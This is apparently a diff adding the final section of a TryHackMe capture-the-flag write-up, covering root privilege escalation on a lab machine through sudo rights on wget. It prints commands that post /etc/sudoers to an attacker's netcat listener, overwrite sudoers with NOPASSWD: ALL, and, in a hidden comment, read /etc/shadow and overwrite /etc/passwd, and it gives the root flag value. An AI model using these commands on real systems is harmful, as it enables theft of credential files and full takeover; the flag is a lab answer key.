@@ -218,3 +218,133 @@ Then Login using PuttY
 With username Being:'jessie' we found before.
 
 ![](2021-06-25-12-01-49.png)
+
+Going into Documents Folder we find the user_flag.txt
+
+![](2021-06-25-12-34-19.png)
+
+
+## Root Privilege Escalation
+
+On Doing
+
+```SH
+    jessie@CorpOne:~$ sudo -l
+    User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+```
+![](2021-06-25-17-38-41.png)
+
+So We have sudo permissions for wget, I wonder what we can do.
+
+* UPLOAD to attacker machine
+* Download to attacker machine
+* Re/Write Files on PWN machine
+* Read Files on PWN machine
+
+So we can directly upload /root/root_flag.txt to Our machine but thats not enough in real life.
+So we will rewrite the `/etc/sudoers` file. 
+
+```nc -lvnp 80```
+
+And then we will write this
+
+```SH
+jessie@CorpOne:~$ sudo wget --post-file=/etc/sudoers {YOUR THM provided IP}
+```
+
+![](2021-06-25-17-44-11.png)
+
+You will get this type of output on your attacking machine
+
+```SH
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.135.145.
+Ncat: Connection from 10.10.135.145:57690.
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: {YOUR THM provided IP}
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 797
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+jessie  ALL=(root) NOPASSWD: /usr/bin/wget
+```
+
+Save The Data To a `sudoer2` file.   
+Edit out the `NOPASSWD: /usr/bin/wget` Portion to `NOPASSWD: ALL` using ONLY `VISUDO`
+
+![](2021-06-25-17-49-30.png)
+
+And upload it back to machine
+
+```SH
+URL=http://{YOUR-IP alloted from THM}/sudoer2
+LFILE=/etc/sudoers
+sudo wget $URL -O $LFILE
+```
+
+```BASH
+jessie@CorpOne:~$ sudo -i
+root@CorpOne:~# ls -la
+total 28
+drwx------  4 root root 4096 oct 26  2019 .
+drwxr-xr-x 23 root root 4096 oct 26  2019 ..
+-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
+drwx------  2 root root 4096 feb 27  2019 .cache
+drwxr-xr-x  2 root root 4096 oct 26  2019 .nano
+-rw-r--r--  1 root root  148 aug 17  2015 .profile
+-rw-r--r--  1 root root   33 oct 26  2019 root_flag.txt
+root@CorpOne:~# cat root_flag.txt
+b1b968b37519ad1daa6408188649263d
+
+```
+
+# VOILA!!
+
+<!-- URL=http://{YOUR THM provided IP}/sudoer2
+LFILE=/etc/sudoers
+sudo wget $URL -O $LFILE
+
+LFILE=/etc/shadow
+wget -i $LFILE
+
+LFILE=/etc/passwd
+TF=$(mktemp)
+echo cat backuppaswd > $TF
+wget -i $TF -o $LFILE -->
